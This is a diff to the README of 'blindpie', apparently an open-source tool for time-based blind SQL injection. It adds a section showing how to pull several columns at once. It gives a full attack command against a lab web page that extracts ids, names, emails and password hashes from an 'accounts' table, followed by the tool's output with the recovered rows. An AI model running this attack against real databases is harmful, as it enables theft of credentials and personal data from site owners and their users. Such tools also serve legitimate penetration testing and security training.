@@ -5,7 +5,7 @@ It should work fine injecting in SELECT, DELETE, and UPDATE queries. Injections 
 
 ## Usage
 
-Use the `-help` command to show the help message:
+Use the `--help` command to show the help message:
 
 ```
  _     _ _           _       _      
@@ -141,6 +141,49 @@ Note #1: use the `-M` parameter to set the reliability of the script. The value 
 Note #2: use the `-T` parameter to set the number of rows to extract concurrently.
 
 The script will test each character of each row and will print the rows found.
+
+### Trick
+
+You can extract multiple columns at a time by concatenating the values. Use the `concat` function as the column name:
+
+```
+$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T10 attack --table accounts --column "concat(id, ' ', first_name, ' ', last_name, ' ', email, ' ', password)" --param email --row 0 --rows 10
+  _     _ _           _       _
+ | |   | (_)         | |     (_)
+ | |__ | |_ _ __   __| |_ __  _  ___
+ | '_ \| | | '_ \ / _` | '_ \| |/ _ \
+ | |_) | | | | | | (_| | |_) | |  __/
+ |_.__/|_|_|_| |_|\__,_| .__/|_|\___|
+                       | |
+                       |_|
+
+[*] avg response time is 0.018 sec (done in 0.054 sec)
+[*] row 0 length is 71
+[*] row 1 length is 70
+[*] row 2 length is 75
+[*] row 3 length is 77
+[*] row 4 seems to be empty
+[*] row 5 seems to be empty
+[*] row 6 seems to be empty
+[*] row 7 seems to be empty
+[*] row 8 seems to be empty
+[*] row 9 seems to be empty
+[*] getting 10 rows: |████████████████████████████████████████| 100.0% complete (373.877 sec)
+> RESULTS:
+1 Arthur Dent arthur@guide.com d00ee262cdcbe7543210bb85f6f1cac257b4e994
+2 Ford Prefect ford@guide.com 30f5cc99c17426a0d28acf8905c6d776039ad022
+3 Tricia McMillan tricia@guide.com bcb3358e273b5772ee0ae1799b612e13cc726b04
+4 Zaphod Beeblebrox zaphod@guide.com 0c38530eaca4dbc0f49c459c0c52b362f14215c3
+[empty]
+[empty]
+[empty]
+[empty]
+[empty]
+[empty]
+[*] all done in 373.877 sec
+```
+
+Note: a row can't be longer than `MAX_ROW_LENGTH` (by default is 128) or it will be ignored and considered empty.
 
 ## Authors
 
